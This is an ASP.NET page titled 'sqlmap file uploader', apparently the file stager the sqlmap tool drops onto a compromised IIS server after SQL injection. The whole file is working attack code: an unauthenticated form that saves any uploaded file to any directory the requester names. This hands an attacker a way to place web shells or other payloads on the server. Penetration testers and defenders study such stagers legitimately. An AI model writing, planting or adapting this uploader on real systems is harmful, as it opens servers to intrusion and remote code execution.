<%@Page Language="C#"%>

<script language="C#" runat="Server">
    void UploadFile(object Sender,EventArgs E)
    {
        if (file.PostedFile != null)
        {
            string filename = file.PostedFile.FileName.Substring(file.PostedFile.FileName.LastIndexOf("\\") + 1) ;

            if (uploadDir.Value != "WRITABLE_DIR")
                filename = uploadDir.Value + '\\' + filename;
            else
                filename = Server.MapPath(".\\" + filename);

            try
            {
                file.PostedFile.SaveAs(filename);
                Response.Write("File uploaded");
            }
            catch (Exception ex)
            {
                Response.Write(ex.Message);
            }
        }
    }
</script>

<%if(!Page.IsPostBack)
{
%>
<form id="FrmFileUploadDemo" name="FrmFileUploadDemo" method="post" enctype="multipart/form-data" runat="server">
<b>sqlmap file uploader</b><br>
<input type="file" id="file" name="file" runat="server">
<br>to directory: <input type=text id="uploadDir" name="uploadDir" value="WRITABLE_DIR" runat="server">
<asp:button text="upload" id="upload" runat="server" onClick="UploadFile" />
</form>
<%
}
%>
